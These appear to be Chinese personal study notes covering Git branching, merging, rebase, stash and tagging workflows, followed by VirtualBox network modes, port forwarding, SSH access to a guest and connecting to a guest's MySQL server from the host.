把dev分支的工作成果合并到master分支上
$ git merge dev

合并完成后就可以放心地删除dev分支了:
$ git branch -d dev

因为创建、合并和删除分支非常快,所以Git鼓励使用分支完成某个任务,合并后再删掉分支,这和直接在master分支上工作效果是一样的,但过程更安全

【 合并冲突 】
在不同分支修改不同的内容后,这些分支各自都分别有新的提交
这种情况下Git无法执行"快速合并",只能试图把各自的修改合并起来,但这种合并就可能会有冲突

$ git merge feature1
Auto-merging readme.txt
CONFLICT (content): Merge conflict in readme.txt
Automatic merge failed; fix conflicts and then commit the result.

结果显示readme.txt文件存在冲突,必须手动解决冲突后再提交。git status可以查看冲突的文件：
$ git status
On branch master
Your branch is ahead of 'origin/master' by 2 commits.
  (use "git push" to publish your local commits)
You have unmerged paths.
  (fix conflicts and run "git commit")
  (use "git merge --abort" to abort the merge)
Unmerged paths:
  (use "git add < file>..." to mark resolution)
  both modified:   readme.txt
no changes added to commit (use "git add" and/or "git commit -a")

查看readme.txt的内容,Git用<<<<<<<,=======,>>>>>>>标记出不同分支的内容,直接修改出图的部分之后add再commit
noend
<<<<<<< HEAD
oh, no
=======
come on
>>>>>>> dev

用带参数的git log也可以看到分支的合并情况
$ git log --graph --pretty=oneline --abbrev-commit

最后删除feature1分支:$ git branch -d feature1

当Git无法自动合并分支时就必须首先解决冲突,再提交,合并完成。
用git log --graph命令可以看到分支合并图

【 分支管理策略 】
通常合并分支时如果可能Git会用Fast forward模式,但这种模式下删除分支后会丢掉分支信息。
如果要强制禁用Fast forward模式,Git就会在merge时生成一个新的commit,这样从分支历史上就可以看出分支信息

合并dev分支,--no-ff参数表示禁用Fast forward用普通模式合并,合并后的历史有分支能看出来曾经做过合并,而fast forward合并就看不出来曾经做过合并
$ git merge --no-ff -m "merge with no-ff" dev
因为本次合并要创建一个新的commit,所以加上-m参数,把commit描述写进去

在实际开发中团队开发中应该按照几个基本原则进行分支管理:
首先master分支应该是非常稳定的,也就是仅用来发布新版本,平时不能在上面干活;
干活都在dev分支上,也就是说dev分支是不稳定的,到某个时候比如1.0版本发布时再把dev分支合并到master上,在master分支发布1.0版本;
每个人都在dev分支上干活,每个人都有自己的分支,时不时地往dev分支上合并就可以了

【 git rebase 】
重新确定所依据的提交历史,将分叉的分支重新合并

</pre>使用merge命令合并时它会把两个分支的最新提交历史C3和C4和这个两个分支的最近的祖先C2进行三方合并,合并的结果就是生成一个新的提交历史<textarea>               / c4 <- experiment
c0 -> c1 -> c2
               \ c3 <- master

               / c4 \ <- experiment
c0 -> c1 -> c2        c5 <- master
               \ c3 /

</textarea><pre>
通过合并操作整合分叉了的历史
在将三方合并的时候,总是需要以一个提交历史作为依据的,在这个提交历史的基础上增加其他两个的修改,merge上使用的就是这个两个分支的最近的祖先C2作为依据

git rebase
rebase同样是通过合并来整合分叉的历史,唯一的不同就是,合并时所依据的提交历史不同(基),它是直接拿两个分支的最新提交历史(C3和C4)中的一个作为依据(即基),比如以C3为基础,提取在C4中引入的补丁和修改,然后在C3的基础上应用一次。

这个过程就相当于改变C4的基底为C3,并将C4上的修改依序应用于C3 上,生成新的C4', 这个过程就改变了C4的基底,也就是所谓的变基。

</pre>将C4中的修改变基到C3上<textarea>               / c4
c0 -> c1 -> c2
               \ c3 -> c4' <- experiment
                master

</textarea><pre>
git rebase [basebranch][topicbranch] , 以basebranch为基,将topicbranch的修改应用于basebranch上。

$ git checkout experiment
$ git rebase master
First, rewinding head to replay your work on top of it...
Applying: added staged command
这时experiment分支的提交历史就已经改变了,master分支在experiment分支之后。

现在回到master分支,进行一次快进合并。
$ git checkout master
$ git merge experiment

c0 -> c1 -> c2 -> c3 -> c4' <- experiment和master

此时C4'指向的快照就和上面使用merge命令的例子中C5指向的快照一模一样了。

这两种整合方法的最终结果没有任何区别,但是变基使得提交历史更加整洁。

区别
无论是通过变基,还是通过三方合并,最后所生成的结果是一样的,只是他们所生成体提交历史不同。
变基：将一个分支的一系列的提交按顺序应用到另一分支上。
三方合并：把两方的最后提交合并在一起。
变基操作的实际是：丢弃一个分支上现有的提交,在另一个分支上新建这些内容但实际上不同的提交。

场景一：本地与远端同一分支提交历史不一致
方式一
多个人在同一个分支上协作时,出现冲突是很正常的,比如现在有一个项目由我和A一同开发。

我在修复了一个bug以后准备提交,然后准备推送到远端
$ git add models/paper.go
$ git commit -m 'fix a bug'
$ git push origin master
To https://gitee.com/greenhn/ganlin.git
 ! [rejected]        master -> master (fetch first)
error: failed to push some refs to 'https://gitee.com/greenhn/ganlin.git'
hint: Updates were rejected because the remote contains work that you do
hint: not have locally. This is usually caused by another repository pushing
hint: to the same ref. You may want to first integrate the remote changes
hint: (e.g., 'git pull ...') before pushing again.
hint: See the 'Note about fast-forwards' in 'git push --help' for details.

push失败了,说明A在之前已经提交了,本地master分支的提交历史已经落后远端了,需要先pull一下,与远端同步后才能push
$ git pull
remote: Enumerating objects: 14, done.
remote: Counting objects: 100% (14/14), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 8 (delta 6), reused 0 (delta 0)
Unpacking objects: 100% (8/8), done.
From https://gitee.com/greenhn/ganlin
   a1bc60a..b91f711  master     -> origin/master
Merge made by the 'recursive' strategy.
 controllers/deal_local_data.go | 14 +++++++++++---
 controllers/rtu_interface.go   |  8 ++++----
 models/instrument_type.go      |  3 +++
 models/rtu_interface.go        |  3 +++
 4 files changed, 21 insertions(+), 7 deletions(-)

pull成功,现在使用git log看下一提交历史：

$ git log --oneline --graph
*   f63ecbf (HEAD -> master) Merge branch 'master' of https://gitee.com/greenhn/ganlin
|\
| * b91f711 (origin/master, origin/HEAD) 修正bug,优化内置通道配置
* | 8b76654 fix a bug
|/
* a1bc60a 完善日报接口
* 9f73b5e 增加内置通道设置功能
* a0d464e ...

分叉了,由于我本地master的提交历史和远端的master分支的提交历史不一致,所以git进行了自动合并,然后生成了一个新的提交历史(f63ecbf Merge branch 'master' of)
如果不想看到分叉就可以用git rebase就可以解决
$ git rebase
First, rewinding head to replay your work on top of it...
Applying: fix a bug

现在再查看一下提交历史：
$ git log --oneline --graph
* 2e2b995 (HEAD -> master) fix a bug
* b91f711 (origin/master, origin/HEAD) 修正bug,优化内置通道配置
* a1bc60a 完善日报接口
* 9f73b5e 增加内置通道设置功能
* a0d464e ...

完美解决,现在再push推送到远端：
$ git push origin master
Enumerating objects: 7, done.
Counting objects: 100% (7/7), done.
Delta compression using up to 4 threads
Compressing objects: 100% (4/4), done.
Writing objects: 100% (4/4), 394 bytes | 394.00 KiB/s, done.
Total 4 (delta 3), reused 0 (delta 0)
remote: Powered By Gitee.com
To https://gitee.com/greenhn/ganlin.git
   b91f711..2e2b995  master -> master

再次查看提交历史
$ git lg --oneline --graph
* 2e2b995 (HEAD -> master, origin/master, origin/HEAD) fix a bug
* b91f711 修正bug,优化内置通道配置
* a1bc60a 完善日报接口
* 9f73b5e 增加内置通道设置功能
* a0d464e ...
现在远端master,远端head,本地master全部统一,问题解决。

方式二
直接执行git pull --rebase,效果与上面是一致的

场景二：不同分支之间的合并
现在要开发一个新的功能。

先创建一个分支用于开发新功能：
$ git checkout -b feature
Switched to a new branch 'feature'
$ git branch
* feature
  master

接下来修改newFunc.go,增加新的功能,并且保存提交
vim newFunc.go
git add newFunc.go
git commit -m 'add new func'

现在查看一下提交
$ git log --oneline --graph
* 4f58ab8 (HEAD -> feature) add new func
* 94c134b (master) init base

$ git branch
* feature
  master

现在新功能开发完毕,需要将它合并的主分支中。

先尝试通过merge合并：
首先切换到master分支
$ git checkout master
Switched to branch 'master'
Your branch is up to date with 'origin/master'.

直接合并feature分支
$ git merge feature
Auto-merging newFunc.go
CONFLICT (content): Merge conflict in newFunc.go
Automatic merge failed; fix conflicts and then commit the result.

失败了,说明两个分支之前的版本已经不同步了,需要手动合并冲突,再提交：
先查看冲突文件：
$ git status
On branch master
Your branch is ahead of 'origin/master' by 7 commits.
  (use "git push" to publish your local commits)

You have unmerged paths.
  (fix conflicts and run "git commit")
  (use "git merge --abort" to abort the merge)

Unmerged paths:
  (use "git add < file>..." to mark resolution)
        both modified:   newFunc.go

打开文件,进行修改
原文件：
func NewFunc() {
<<<<<<< HEAD
=======
  fmt.Println("add new func")
>>>>>>> feature
}
修改后：
func NewFunc() {
  fmt.Println("add new func")
}

现在通过add添加,然后commit提交
$ git add newFunc.go
$ git commit -m 'merge master and feature'
[master 562ec58] merge master and feature

现在在查看一下分支提交历史：
$ git log --oneline --graph
*   562ec58 (HEAD -> master) merge master and feature
|\
| * 4f58ab8 (feature) add new func
* | 0e80f97 do something
|/
* 94c134b init base
虽然合并成功,但Master已经保存了合并历史,出现开叉了！对于强迫症患者来说肯定是不能接受的。

通过rebase合并分支：
现在将版本退回到合并前,也就是回退一个版本
$ git reset --hard head^
HEAD is now at 0e80f97 do something

$ git log --oneline --graph
* 0e80f97 (HEAD -> master) do something
* 94c134b init base
退回去了,现在是位于master分支的init base提交这里。

先切换回feature分支：
$ git checkout feature
Switched to branch 'feature'

在feature分支上执行: git rebase master,以master为基础,将feature分支上的修改增加到master分支上,并生成新的版本。
$ git rebase master
First, rewinding head to replay your work on top of it...
Applying: add new func
Using index info to reconstruct a base tree...
M       newFunc.go
Falling back to patching base and 3-way merge...
Auto-merging newFunc.go
CONFLICT (content): Merge conflict in newFunc.go
error: Failed to merge in the changes.
Patch failed at 0001 add new func
hint: Use 'git am --show-current-patch' to see the failed patch

Resolve all conflicts manually, mark them as resolved with
"git add/rm < conflicted_files>", then run "git rebase --continue".
You can instead skip this commit: run "git rebase --skip".
To abort and get back to the state before "git rebase", run "git rebase --abort".

失败了,原因很简单,两个分支修改个同一个文件,产生了冲突。所以先需要解决冲突：

打开冲突的文件,解决冲突
原文件：
func NewFunc() {
<<<<<<< HEAD
=======
  fmt.Println("add new func")
>>>>>>> add new func
}

修改后：
func NewFunc() {
  fmt.Println("add new func")
}

现在通过add添加
$ git add newFunc.go

现在是重点,之前的rebase其实只是完成了一半,由于出现冲突而终止,现在冲突解决,可以通过git rebase —continue继续完成之前的rebase操作。
HowiedeiMac:hello howie$ git rebase --continue
Applying: add new func

rebase完成,再查看一下提交历史：
HowiedeiMac:hello howie$ git log --oneline --graph
* b2593e6 (HEAD -> feature) add new func
* 0e80f97 (master) do something
* 94c134b init base

提交记录已经是一条完美的直线。现在切换到主分支master,将feather分支上的提交合并过来。
git checkout master
git merge feature

$ git checkout master
Switched to branch 'master'
Your branch is ahead of 'origin/master' by 7 commits.
  (use "git push" to publish your local commits)

HowiedeiMac:hello howie$ git merge feature
Updating 0e80f97..b2593e6
Fast-forward
 newFunc.go | 1 +
 1 file changed, 1 insertion(+)

再次查看一下提交历史：
$ git log --oneline --graph
* b2593e6 (HEAD -> master, feature) add new func
* 0e80f97 do something
* 94c134b init base

问题解决,master上也是一条直线了,最后删除掉feature分支：
$ git branch -d feature
Deleted branch feature (was b2593e6).

【 git stash bug分支 】
有bug就需要修复,在Git中每个bug都可以通过一个新的临时分支来修复,修复后合并分支,然后将临时分支删除

当工作进行到一半还没法提交,但同时必须修复bug时,Git还提供了一个stash功能把当前工作现场"储藏"起来,等以后恢复现场后继续工作:
$ git stash

现在用git status查看工作区就是干净的(除非有没有被Git管理的文件),因此可以放心地创建分支来修复bug

首先确定要在哪个分支上修复bug,假定需要在master分支上修复,就从master创建临时分支
$ git checkout master
$ git checkout -b issue-101
修复bug之后git add commit,修复完成后切换到master分支并完成合并,最后删除issue-101分支
$ git checkout master
$ git merge --no-ff -m "merged bug fix 101" issue-101
$ git branch -d issue-101
接着回到dev分支干活
$ git checkout dev
$ git status
用git stash list命令看看:
$ git stash list
Git把stash内容存在某个地方了,但需要恢复一下有两个办法:
1、用git stash apply恢复,但恢复后stash内容并不删除,需要用git stash drop来删除;
2、用git stash pop,恢复的同时把stash内容也删了
$ git stash pop
再用git stash list查看,就看不到任何stash内容了:
$ git stash list
可以多次stash,恢复的时候先用git stash list查看,然后恢复指定的stash
$ git stash apply stash@{0}

小结
修复bug时会通过创建新的bug分支进行修复,然后合并,最后删除;
当手头工作没有完成时,先把工作现场git stash一下,然后去修复bug,修复后再git stash pop,回到工作现场

【 Feature分支 】
软件开发中总有无穷无尽的新功能要不断添加进来,添加一个新功能时不希望因为一些实验性质的代码,把主分支搞乱了,所以每添加一个新功能最好新建一个feature分支,在上面开发完成后合并,最后删除该feature分支

例:开发代号为Vulcan的新功能
$ git checkout -b feature-vulcan
$ git add vulcan.py
$ git commit -m "add feature vulcan"
切回dev,准备合并,然后删除:
$ git checkout dev
但是突然新功能必须取消
$ git branch -d feature-vulcan
销毁失败。Git友情提醒,feature-vulcan分支还没有被合并,如果删除,将丢失掉修改,如果要强行删除,需要使用命令git branch -D feature-vulcan。
现在强行删除:
$ git branch -D feature-vulcan

小结
开发一个新feature,最好新建一个分支;
如果要丢弃一个没有被合并过的分支,可以通过git branch -D < name >强行删除

【 多人协作 】
当从远程仓库克隆时实际上Git自动把本地的master分支和远程的master分支对应起来了,并且远程仓库的默认名称是origin。

推送分支就是把该分支上的所有本地提交推送到远程库,推送时要指定本地分支,这样Git就会把该分支推送到远程库对应的远程分支上:
$ git push origin master

但并不是一定要把本地分支往远程推送,那么哪些分支需要推送,哪些不需要呢？
master分支是主分支,因此要时刻与远程同步;
dev分支是开发分支,团队所有成员都需要在上面工作,所以也需要与远程同步;
bug分支只用于在本地修复bug就没必要推到远程了,除非老板要看看每周到底修复了几个bug;
feature分支是否推到远程,取决于是否和同事合作在上面开发。
总之在Git中分支完全可以在本地自己藏着玩,自己决定是否推送

抓取分支
模拟一个同事,可以在另一台电脑(要把SSH Key添加到GitHub)或同一台电脑的另一个目录下克隆
$ git clone git@github.com:berlin75/gitkills.git
当同事从远程库clone时默认同事只能看到本地的master分支,可用git branch命令看

现在同事要在dev分支上开发就必须创建远程origin的dev分支到本地,于是他用这个命令创建本地dev分支:
$ git checkout -b dev origin/dev
现在他就可以在dev上继续修改,然后时不时地把dev分支push到远程
同事已经向origin/dev分支推送了他的提交,而碰巧你也对同样的文件作了修改,并试图推送

$ git push origin dev
To github.com:michaelliao/learngit.git
 ! [rejected]        dev -> dev (non-fast-forward)
error: failed to push some refs to 'git@github.com:michaelliao/learngit.git'
hint: Updates were rejected because the tip of your current branch is behind
hint: its remote counterpart. Integrate the remote changes (e.g.
hint: 'git pull ...') before pushing again.
hint: See the 'Note about fast-forwards' in 'git push --help' for details.

推送失败,因为同事的最新提交和你试图推送的提交有冲突,Git提示先用git pull把最新的提交从origin/dev抓下来,然后在本地合并解决冲突,再推送:
$ git pull
There is no tracking information for the current branch.
Please specify which branch you want to merge with.
See git-pull(1) for details.
    git pull < remote> < branch>
If you wish to set tracking information for this branch you can do so with:
    git branch --set-upstream-to=origin/< branch> dev

git pull也失败了,原因是没有指定本地dev分支与远程origin/dev分支的链接,根据提示设置dev和origin/dev的链接,再pull
$ git branch --set-upstream dev origin/dev
$ git pull

git pull成功,但合并有冲突,需要手动解决,解决的方法和分支管理中的解决冲突完全一样,解决后commit,再push

因此多人协作的工作模式通常是这样:
首先可以试图用git push origin branch-name推送自己的修改;
如果推送失败则因为远程分支比本地更新,需要先用git pull试图合并;
如果合并有冲突,则解决冲突,并在本地提交;
没有冲突或解决掉冲突后,再用git push origin branch-name推送就能成功

如果git pull提示"no tracking information"则说明本地分支和远程分支的链接关系没有创建,用命令git branch --set-upstream branch-name origin/branch-name。

小结
查看远程库信息,使用git remote -v;
本地新建的分支如果不推送到远程,对其他人就是不可见的;
从本地推送分支,使用git push origin branch-name,如果推送失败,先用git pull抓取远程的新提交;
在本地创建和远程分支对应的分支,使用git checkout -b branch-name origin/branch-name,本地和远程分支的名称最好一致;
建立本地分支和远程分支的关联,使用git branch --set-upstream branch-name origin/branch-name;
从远程抓取分支,使用git pull,如果有冲突就要先处理冲突

【 git tag 标签管理 】
$ git tag                               # 列出所有tag
$ git tag [tag]                         # 新建一个tag在当前commit,默认为HEAD,如git tag v1.0,版本号是v1.0
$ git tag [tag] [commit]                # 新建一个tag在指定commit
$ git tag -a [tag] -m "blablabla..."    # 指定标签信息
$ git tag -s [tag] -m "blablabla..."    # 用PGP签名标签
$ git tag -d [tag]                      # 删除本地tag
$ git push origin :refs/tags/[tagname]  # 删除远程tag
$ git show [tag]                        # 查看tag信息
$ git push [remote] [tag]               # 提交指定tag
$ git push [remote] --tags              # 提交所有tag
$ git checkout -b [branch] [tag]        # 新建分支指向某个tag

发布一个版本时通常先在版本库中打一个标签(tag),这样就唯一确定了打标签时刻的版本。将来无论什么时候,取某个标签的版本就是把那个打标签的时刻的历史版本取出来,所以标签也是版本库的一个快照

Git的标签虽然是版本库的快照,但其实它就是指向某个commit的指针(跟分支很像,但分支可以移动,标签不能移动),所以创建和删除标签都是瞬间完成的

默认标签是打在最新提交的commit上的。如果忘了打标签,比如现在已经是周五了,但应该在周一打的标签没有打,解决方法是找到历史提交的commitid,然后打上就可以了
$ git log --pretty=oneline --abbrev-commit
$ git tag v0.9 6224937

标签不是按时间顺序列出,而是按字母排序的,可以用git show < tagname >查看标签信息:
$ git show v0.9

创建带有说明的标签,用-a指定标签名,-m指定说明文字:
$ git tag -a v0.1 -m "version 0.1 released" 3628164
用git show < tagname >命令可以看到说明文字:
$ git show v0.1

还可以通过-s用私钥签名一个标签:
$ git tag -s v0.2 -m "signed version 0.2 released" fec145a
签名采用PGP签名,因此必须首先安装gpg(GnuPG),如果没有找到gpg,或者没有gpg密钥对,就会报错
用命令git show < tagname >可以看到PGP签名信息:
$ git show v0.2
用PGP签名的标签是不可伪造的,因为可以验证PGP签名。验证签名的方法比较复杂

删除标签
因为创建的标签都只存储在本地,不会自动推送到远程,所以打错的标签可以在本地安全删除
$ git tag -d v0.1

如果要推送某个标签到远程,使用命令git push origin < tagname >:
$ git push origin v1.0

或一次性推送全部尚未推送到远程的本地标签:
$ git push origin --tags

如果标签已经推送到远程,要删除远程标签就麻烦一点,先从本地删除:
$ git tag -d v0.9
然后从远程删除,删除命令也是push,但格式如下:
$ git push origin :refs/tags/v0.9
要看看是否真的从远程库删除了标签,可以登陆GitHub查看

使用国内的Git托管服务——码云(gitee.com)
码云的免费版本也提供私有库功能,只是有5人的成员上限

【 搭建git服务器 】
GitHub就是一个免费托管开源代码的远程仓库,但对于某些视源代码如生命的商业公司来说,既不想公开源代码,又舍不得给GitHub交保护费,那就只能自己搭建一台Git服务器作为私有仓库使用,搭建Git服务器需要准备一台运行Linux的机器

</pre>
</div>

<div id="virtualbox">
<h2>virtualbox</h2><pre>
虚拟机网关ip地址
1、登录虚拟机,查看上次的登录信息
2、若为静态ip地址则debian/ubuntu下cat /etc/network/interfaces,redhat/centos下cat /etc/sysconfig/network,cat /etc/sysconfig/network里面gateway项
3、若为dhcp,动态分配ip地址,则采用指令route,default那行对应的gateway即虚拟机网关地址

virtualbox默认网关是10.0.2.2

【VirtualBox的提供了四种网络接入模式】
1、NAT 网络地址转换模式(NAT,Network Address Translation)
2、Bridged Adapter 桥接模式
3、Internal 内部网络模式
4、Host-only Adapter 主机模式

第一种 NAT模式
NAT模式是最简单的实现虚拟机上网的方式,Vhost访问网络的所有数据都是由主机提供的,vhost并不真实存在于网络中,主机与网络中的任何机器都不能查看和访问到Vhost的存在。

虚拟机与主机关系:
只能单向访问,虚拟机可以通过网络访问到主机(此时ping虚拟机的网关,即是ping主机),主机无法通过网络访问到虚拟机。
虚拟机与网络中其他主机的关系:
只能单向访问,虚拟机可以访问到网络中其他主机,其他主机不能通过网络访问到虚拟机。
虚拟机与虚拟机之间的关系:
相互不能访问,虚拟机与虚拟机各自完全独立,相互间无法通过网络访问彼此。

IP:10.0.2.15
网关:10.0.2.2
DNS:10.0.2.3

原理:
虚拟机的请求传递给NAT Engine,由它来利用主机进行对外的网络访问,返回的数据包再由NAT Engine给虚拟机

一台虚拟机的多个网卡可以被设定使用NAT, 第一个网卡连接了到专用网10.0.2.0,第二个网卡连接到专用网络10.0.3.0,等等

NAT方案优缺点:
笔记本已插网线时: 虚拟机可以访问主机,虚拟机可以访问互联网,在做了端口映射后(最后有说明),主机可以访问虚拟机上的服务(如数据库)。
笔记本没插网线时: 主机的"本地连接"有红叉的,虚拟机可以访问主机,虚拟机不可以访问互联网,在做了端口映射后,主机可以访问虚拟机上的服务(如数据库)。

第二种 Bridged Adapter模式
网桥模式模拟度相当完美,通过主机网卡架设了一条桥,直接连入到网络中。使得虚拟机能被分配到一个网络中独立的IP,所有网络功能完全和在网络中的真实机器一样。

虚拟机与主机关系:
可以相互访问,因为虚拟机在真实网络段中有独立IP,主机与虚拟机处于同一网络段中,网关与本机网关相同,彼此可以通过各自IP相互访问。
虚拟机于网络中其他主机关系:
可以相互访问,同样因为虚拟机在真实网络段中有独立IP,虚拟机与所有网络其他主机处于同一网络段中,彼此可以通过各自IP相互访问。
虚拟机于虚拟机关系:
可以相互访问,原因同上。

IP:一般是DHCP分配的,与主机的"本地连接"的IP 是同一网段的。虚拟机就能与主机互相通信。

笔记本已插网线时:(若网络中有DHCP服务器)主机与虚拟机会通过DHCP分别得到一个IP,这两个IP在同一网段。 主机与虚拟机可以ping通,虚拟机可以上互联网。
笔记本没插网线时:主机与虚拟机不能通信。主机的"本地连接"有红叉,就不能手工指定IP。虚拟机也不能通过DHCP得到IP地址,手工指定IP后,也无法与主机通信,因为主机无IP。
这时主机的VirtualBox Host-Only Network 网卡是有ip的,192.168.56.1。虚拟机就算手工指定了IP 192.168.56.*,也ping不能主机。

第三种 Internal模式
内网模式,顾名思义就是内部网络模式,虚拟机与外网完全断开,只实现虚拟机于虚拟机之间的内部网络模式。

虚拟机与主机关系:
不能相互访问,彼此不属于同一个网络,无法相互访问。
虚拟机与网络中其他主机关系:
不能相互访问,理由同上。
虚拟机与虚拟机关系:
可以相互访问,前提是在设置网络时,两台虚拟机设置同一网络名称。如上配置图中,名称为intnet。

ip样式:
ip 169.254.147.9
子网掩码 255.255.0.0
默认网关 无

IP: VirtualBox的DHCP服务器会为它分配IP ,一般得到的是192.168.56.101,因为是从101起分的,也可手工指定192.168.56.*。
笔记本已插网线时:虚拟机可以与主机的VirtualBox Host-Only Network 网卡通信
这种方案不受主机本地连接(网卡)是否有红叉的影响。

第四种 Host-only Adapter模式
主机模式是一种比较复杂的模式,前面几种模式所实现的功能,在这种模式下通过虚拟机及网卡的设置都可以被实现。

Vbox在主机中模拟出一张专供虚拟机使用的网卡,所有虚拟机都是连接到该网卡上的,可以通过设置这张网卡来实现上网及其他很多功能,比如(网卡共享、网卡桥接等)
虚拟机与主机通信是通过主机的名为VirtualBox Host-Only Network的网卡,因此ip是该网卡ip 192.168.56.1,而不是现在正在上网所用的ip

虚拟机与主机关系
默认不能相互访问,双方不属于同一IP段,host-only网卡默认IP段为192.168.56.X 子网掩码为255.255.255.0,后面的虚拟机被分配到的也都是这个网段。通过网卡共享、网卡桥接等,可以实现虚拟机于主机相互访问。

虚拟机与网络主机关系
默认不能相互访问,原因同上,通过设置,可以实现相互访问。
虚拟机与虚拟机关系
默认可以相互访问,都是同处于一个网段。

虚拟机访问主机用的是主机的VirtualBox Host-Only Network网卡的IP:192.168.56.1 ,不管主机"本地连接"有无红叉,永远通。
主机访问虚拟机,用是的虚拟机的网卡3的IP: 192.168.56.101 ,不管主机"本地连接"有无红叉,永远通。
虚拟机访问互联网,用的是自己的网卡2, 这时主机要能通过"本地连接"有线上网,(无线网卡不行)

通过对以上几种网络模式的了解,以灵活运用,模拟组建出想要的任何一种网络环境了。
比如想模拟出来一个一台主机,监控一个局域网上网情况的网络环境。
首先开启了两台虚拟机vhost1与vhost2,当然如果硬件允许,我同样可以再增加vhost3、vhost4…
所有的vhost我都设置成internat内网模式,网络名称为intnal,网关为192.168.56.100,意思就是通过 192.168.56.100网卡上网。其中有一台vhost1我设置为双网卡,一张为内网模式(192.168.56.100),一张为网桥模式(192.168.1.101)。两张网卡设置双网卡共享上网
虚拟机之间为局域网,其中有一台虚拟机vhost1通过与外网相连,所有局域网中的虚拟机又通过vhost1来实现上外网。这样vhost1就可以监控整个虚拟机局域网上网情况了。

【实现宿主机和虚拟机之间网络的通讯】
环境:
宿主机操作系统            WindowsXP
虚拟机软件                    VirtualBox
虚拟机操作系统             Linux

原理:
host-only(主机模式)
在某些特殊的网络调试环境中,要求将真实环境和虚拟环境隔离开,这时可采用host-only模式。在host-only模式中所有的虚拟系统是可以相互通信的,但虚拟系统和真实的网络是被隔离开的。　　

在host-only模式下,虚拟系统和宿主机器系统是可以相互通信的,相当于这两台机器通过双绞线互连。

在host-only模式下,虚拟系统的TCP/IP配置信息(如IP地址、网关地址、DNS服务器等),都是由VMnet1(host-only)虚拟网络的DHCP服务器来动态分配的。

如果想利用VirtualBox创建一个与网内其他机器相隔离的虚拟系统,进行某些特殊的网络调试工作,可以选择host-only模式

步骤:
1,查看宿主机的IP配置情况:
在window XP命令提示行输入ipconfig命令
看到宿主机的IP是192.168.56.1
在虚拟机配置相同网段的IP,即可实现通信

2,配置VBOX
在VirtualBox中设置网络连接,启用host-only连接模式。

在虚拟机LIUNX
#cd /etc/sysconfig/network-scripts
#cp ifcfg-eh0 ifcfg-eth1
#vi ifcfg-eh1
DEVICE=eth1
IPADDR=192.168.56.56
NETMASK=255.255.255.0
#service network restart
#ping 192.168.56.1   通
OK

【 VirtualBox主机和虚拟机互相通信 】
默认情况下VirtualBox虚拟机网络设置为网络地址转换,虚拟机中的地址一般是10.0.2.x,虚拟机中访问主机只需要访问默认网关地址即可,但是主机访问虚拟机就需要增加一些配置了,方法有以下几种:

1. 修改虚拟机网络设置
修改为桥接网卡,此时虚拟机会和主机以及同一路由器下的其他主机都在同一网段,连接的是同一个路由器,普通家庭路由器可以使用此方法,如果路由器需要认证则此方法无效,虚拟机会暴露在局域网下,所以不建议使用此方法。

2. 网络地址转换设置端口转发Port forwarding(推荐)
所谓的映射、转发是针对接收数据的端口而言的,一般用作服务端,要侦听的
应用场景如:原本有个服务程序在PC2上运行,侦听着PC2上的B端口,现在希望在不动PC2及服务程序的前提下,外界能通过PC1的A端口与PC2上服务程序通信,这时就需要用端口映射(端口转发)来解决。
将PC1的A端口映射到PC2的B端口,是指将PC1的A端口收到的数据转发到PC2的B端口。外界都来连PC1的A端口,PC1的A端口只做受理窗口,具体业务处理放在PC2的B端口。其实,PC2的B端仍然能用,就是多了一个受理窗口(PC1的A端口)

网卡1 -> 高级 -> 端口转发
测试规则 协议tcp 主机端口5556 子系统端口3325

主机直接连接192.168.56.1:5556会自动转发到虚拟机的3325端口,192.168.56.1是以下网卡的地址,一般都是这个地址:

以太网适配器 VirtualBox Host-Only Network:

   连接特定的 DNS 后缀 . . . . . . . :
   本地链接 IPv6 地址. . . . . . . . : fe80::6cb5:b51f:5fb3:d7de%64
   IPv4 地址 . . . . . . . . . . . . : 192.168.56.1
   子网掩码  . . . . . . . . . . . . : 255.255.255.0
   默认网关. . . . . . . . . . . . . :

3. 增加一张网卡
首先关闭虚拟机,设置:
网卡2 -> 启用网络连接  -> host-only -> 界面名称virtualbox host-only ethernet adapter
此时虚拟机会有两个网卡

在本地连接2中右键--属性,手动获取ip,设置如下,此时主机只要访问192.168.56.128即可访问虚拟机
ip      192.168.56.128
子网掩码 255.255.255.0
网关     192.168.56.1
勾选使用下面的dns服务器

【宿主机wsl使用ssh登录虚拟机ubuntu】
1、端口转发
添加端口转发 8822 -> 22
配置好本机转发端口号和虚拟机SSH端口号(默认为22)后,保存。 这样在本机终端中输入:

$  ssh -p 8822 username@127.0.0.1
或
$ ssh -p 8822 username@localhost

2、新建虚拟网卡
对虚拟机新建一块虚拟网卡,并分配一个IP地址,也可以使用SSH连接。

界面名称
en0:Wi-Fi(AirPort)

在网卡2选项中使用桥接方式,然后在虚拟机中配置好第二块网卡。 如本人使用的ubuntu server,修改 /etc/network/interfaces 。

# lang: shell
# The loopback network interface
auto lo
iface lo inet loopback

# The primary network interface
auto eth0
iface eth0 inet dhcp

# net 1
#auto eth1
#iface eth1 inet static
#address 192.168.123.150     // 网络环境1
##address 10.0.0.246         // 网络环境2
#netmask 255.255.255.0
将net1下的行前#号去掉,并根据不同网络进行配置即可。重启虚拟机,使之生效。(本人使用networking restart并未生效,因而选择重启)

【win下连接virtualbox中linux虚拟机的mysql】
1、设置nat端口转发(子系统端口一定为3306,主机端口自定义,协议为TCP)
打开virtualbox虚拟机的设置,选择网络——高级——端口转发——添加转发规则。

2、设置允许远程连接mysql
在虚拟机的命令终端中,输入mysql,进入mysql,执行以下两句命令
grant all privileges on *.* to '用户名'@'%' identifiedby '密码' with grant option;
flush privileges;

grant授权中,@'%'指允许任意ip地址远程登录,如果只想允许本机登录,其ip地址填的是网关好像,获得方法如下:
(1)为打开putty,登录,查找'Last login: xx xx xx xx:xx:xx 2015 from xxx.xxx.xxx.xxx',from后面即为虚拟机网关地址
(2)若为静态ip地址,则debian/ubuntu下cat /etc/network/interfaces,redhat/centos下cat /etc/sysconfig/network;
(3)若为dhcp,动态分配ip地址,则采用指令route,default那行对应的gateway即虚拟机网关地址

virtualbox默认网关好像是10.0.2.2,vmware可进行查看或修改

3、修改my.cnf 文件的bind_address
my.cnf(/etc/mysql/my.cnf)找到bind_address

修改方法有以下三种
法一 注释bind_address=127.0.0.1
法二 修改bind_address=0.0.0.0
法三 修改bind_address=虚拟机ip地址(ifconfig得到)

4、 重启mysql
执行/etc/init.d/mysql restart

5、Win下连接mysql
连接地址为主机ip地址(cmd中用命令ipconfig可以查看),端口号对应第一步中的主机端口,用户和密码对应第二步中的用户和密码

登录进去时,可能会弹出一个提示,说没有找到配置什么的,这个问题我还没找到解决办法,但是貌似对后面的操作没有什么影响,直接点击ok就好了

【virtualbox虚拟机里的程序如何连接到宿主机里的数据库】
